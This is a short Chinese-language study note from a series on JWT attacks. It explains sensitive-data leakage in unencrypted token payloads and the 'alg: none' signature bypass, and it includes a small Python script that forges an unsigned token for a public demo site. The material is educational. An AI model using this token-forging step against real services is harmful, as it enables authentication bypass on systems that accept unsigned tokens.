---
tags: [JWT]
title: jwt-6
created: '2019-07-30T08:27:50.931Z'
modified: '2019-09-03T10:09:57.304Z'
---

0x03 JWT攻击技术

1.敏感信息泄露

显然，由于有效载荷是以明文形式传输的，因此，如果有效载荷中存在敏感信息的话，就会发生信息泄露。

2.将签名算法改为none

我们知道，签名算法可以确保JWT在传输过程中不会被恶意用户所篡改。

但头部中的alg字段却可以改为none。

另外，一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。

将alg字段改为none后，系统就会从JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。

这种攻击的具体例子可以从http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php中找到。

此外，相关的代码也可以从Github上找到，具体地址为https://github.com/Sjord/jwtdemo/。

相关代码如下所示：

import jwt
import base64
# header
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
# {"typ":"JWT","alg":"HS256"}
#payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0
# {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1504006435,"exp":1504006555,"data":{"hello":"world"}}
def b64urlencode(data):
    return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')

print b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}") + \
    '.' + b64urlencode("{\"data\":\"test\"}") + '.'
结果如下所示：



图6
